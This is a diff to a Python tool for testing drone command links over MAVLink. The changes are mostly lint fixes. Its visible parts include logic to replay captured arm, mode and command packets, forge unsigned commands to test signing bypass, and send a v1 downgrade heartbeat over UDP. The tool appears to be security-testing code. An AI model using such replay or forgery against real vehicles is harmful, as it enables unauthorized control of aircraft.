@@ -37,7 +37,6 @@ Requirements:
 import argparse
 import hashlib
 import json
-import os
 import select
 import socket
 import struct
@@ -438,7 +437,7 @@ def cmd_analyze(args):
         ts_min = min(timestamps)
         ts_max = max(timestamps)
         ts_span = (ts_max - ts_min) / 100000.0  # seconds
-        print(f"\nTimestamp range:")
+        print("\nTimestamp range:")
         print(f"  First: {ts_min} ({mavlink_ts_to_str(ts_min)})")
         print(f"  Last:  {ts_max} ({mavlink_ts_to_str(ts_max)})")
         print(f"  Span:  {ts_span:.2f} seconds")
@@ -453,13 +452,13 @@ def cmd_analyze(args):
             viable = [p for p in packets
                       if p.get("timestamp") and (current_ts - p["timestamp"]) < replay_window_ticks]
             print(f"\n  {len(viable)} of {len(packets)} packets are <{REPLAY_WINDOW_SECONDS}s old")
-            print(f"  NOTE: timestamp age alone does not establish replay viability.")
-            print(f"  The receiver's per-stream anti-replay state, valid authentication,")
-            print(f"  and accept_unsigned policy all affect whether packets are accepted.")
+            print("  NOTE: timestamp age alone does not establish replay viability.")
+            print("  The receiver's per-stream anti-replay state, valid authentication,")
+            print("  and accept_unsigned policy all affect whether packets are accepted.")
         else:
             print(f"\n  Newest packet is {age:.0f}s old (>{REPLAY_WINDOW_SECONDS}s)")
-            print(f"  Acceptance depends on receiver state: cold-start (no baseline)")
-            print(f"  or accept_unsigned policy may still permit replay.")
+            print("  Acceptance depends on receiver state: cold-start (no baseline)")
+            print("  or accept_unsigned policy may still permit replay.")
 
     # Replayable command packets
     attack_msgs = {"COMMAND_LONG", "SET_MODE", "COMPONENT_ARM_DISARM",
@@ -507,7 +506,7 @@ def cmd_replay(args):
             print(f"Cross-link replay: changing link_id to {args.cross_link}")
         if args.timestamp_offset:
             print(f"Timestamp offset: {args.timestamp_offset} seconds")
-        print(f"\nPackets that would be replayed:")
+        print("\nPackets that would be replayed:")
         for i, p in enumerate(packets[:20]):
             raw = bytes.fromhex(p["raw_hex"])
             pkt = MavlinkPacket(raw)
@@ -517,7 +516,7 @@ def cmd_replay(args):
                   f"ts={p.get('timestamp_utc', '?')}")
         if len(packets) > 20:
             print(f"  ... and {len(packets) - 20} more")
-        print(f"\nRe-run with --execute to send these packets.")
+        print("\nRe-run with --execute to send these packets.")
         return
 
     # Parse signing key if provided
@@ -651,9 +650,9 @@ def cmd_forge_unsigned(args):
         print(f"  Message: {MSG_NAMES.get(msg_id, f'MSG_{msg_id}')} ({msg_id})")
         print(f"  Packet: {packet.hex()}")
         print(f"  Length: {len(packet)} bytes")
-        print(f"\n  This tests whether the target accepts UNSIGNED commands.")
-        print(f"  If accepted, signing is effectively bypassed.")
-        print(f"\n  Re-run with --execute to send.")
+        print("\n  This tests whether the target accepts UNSIGNED commands.")
+        print("  If accepted, signing is effectively bypassed.")
+        print("\n  Re-run with --execute to send.")
         return
 
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -689,12 +688,12 @@ def cmd_downgrade_v1(args):
     packet = header + payload + crc_bytes
 
     if not args.execute:
-        print(f"\nDRY RUN — MAVLink v1 HEARTBEAT (downgrade test):")
+        print("\nDRY RUN — MAVLink v1 HEARTBEAT (downgrade test):")
         print(f"  Target: {target_host}:{target_port}")
         print(f"  System ID: {sys_id}")
         print(f"  Packet: {packet.hex()}")
-        print(f"\n  If the target responds to v1, signing is fully bypassed.")
-        print(f"\n  Re-run with --execute to send.")
+        print("\n  If the target responds to v1, signing is fully bypassed.")
+        print("\n  Re-run with --execute to send.")
         return
 
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -708,7 +707,7 @@ def cmd_downgrade_v1(args):
         data, addr = sock.recvfrom(4096)
         log(f"RESPONSE from {addr}: {len(data)} bytes — v1 ACCEPTED!")
         log(f"  Raw: {data[:20].hex()}...")
-    except socket.timeout:
+    except TimeoutError:
         log("No response within 3s — v1 may be rejected (or target unreachable)")
     sock.close()
 
